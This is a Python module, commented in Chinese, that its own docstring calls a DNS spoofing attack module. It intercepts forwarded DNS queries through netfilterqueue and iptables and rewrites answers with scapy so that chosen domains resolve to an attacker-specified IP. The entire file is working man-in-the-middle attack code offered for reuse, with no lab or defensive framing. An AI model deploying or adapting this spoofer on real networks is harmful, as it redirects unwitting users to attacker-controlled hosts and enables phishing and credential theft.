#!/usr/bin/env python3
"""
DNS欺騙攻擊模組
實現DNS欺騙攻擊，將網域名稱解析到攻擊者指定的IP
"""

import netfilterqueue
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, Raw
import threading

class DNSSpoofer:
    def __init__(self, spoof_domains=None, redirect_ip=None):
        """
        初始化DNS欺騙器
        
        Args:
            spoof_domains: 要欺騙的網域名稱列表
            redirect_ip: 重新導向到的IP位址
        """
        self.spoof_domains = spoof_domains or []
        self.redirect_ip = redirect_ip or "192.168.1.100"
        self.spoofing = False
        self.queue = None
        self.queue_num = 0
    
    def process_packet(self, packet):
        """處理資料包"""
        try:
            scapy_packet = IP(packet.get_payload())
            
            if scapy_packet.haslayer(DNSQR):
                qname = scapy_packet[DNSQR].qname.decode('utf-8').rstrip('.')
                
                # 檢查是否需要欺騙此網域名稱
                if any(domain in qname for domain in self.spoof_domains):
                    print(f"[+] DNS欺騙: {qname} -> {self.redirect_ip}")
                    
                    # 修改DNS回應
                    answer = DNSRR(rrname=qname, rdata=self.redirect_ip)
                    scapy_packet[DNS].an = answer
                    scapy_packet[DNS].ancount = 1
                    
                    # 刪除校驗和和長度欄位，讓系統重新計算
                    del scapy_packet[IP].len
                    del scapy_packet[IP].chksum
                    del scapy_packet[UDP].len
                    del scapy_packet[UDP].chksum
                    
                    packet.set_payload(bytes(scapy_packet))
            
            packet.accept()
        except Exception as e:
            print(f"處理資料包錯誤: {e}")
            packet.accept()
    
    def start(self, queue_num=0):
        """
        開始DNS欺騙
        
        Args:
            queue_num: netfilterqueue佇列號
        """
        if self.spoofing:
            return False
        
        try:
            self.queue_num = queue_num
            self.queue = netfilterqueue.NetfilterQueue()
            self.queue.bind(queue_num, self.process_packet)
            self.spoofing = True
            
            # 設定iptables規則
            import subprocess
            subprocess.run(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', 
                          '--queue-num', str(queue_num)], check=True)
            
            print(f"[+] DNS欺騙已啟動 (佇列: {queue_num})")
            print(f"[+] 欺騙網域: {', '.join(self.spoof_domains)}")
            print(f"[+] 重新導向到: {self.redirect_ip}")
            
            # 在背景執行緒中執行佇列
            queue_thread = threading.Thread(target=self.queue.run, daemon=True)
            queue_thread.start()
            
            return True
        except Exception as e:
            print(f"啟動DNS欺騙錯誤: {e}")
            print("提示: 需要root權限，並且需要安裝netfilterqueue")
            return False
    
    def stop(self):
        """停止DNS欺騙"""
        if not self.spoofing:
            return False
        
        try:
            self.spoofing = False
            if self.queue:
                self.queue.unbind()
            
            # 刪除iptables規則
            import subprocess
            subprocess.run(['iptables', '-D', 'FORWARD', '-j', 'NFQUEUE', 
                          '--queue-num', str(self.queue_num)], check=False)
            
            print("[+] DNS欺騙已停止")
            return True
        except Exception as e:
            print(f"停止DNS欺騙錯誤: {e}")
            return False


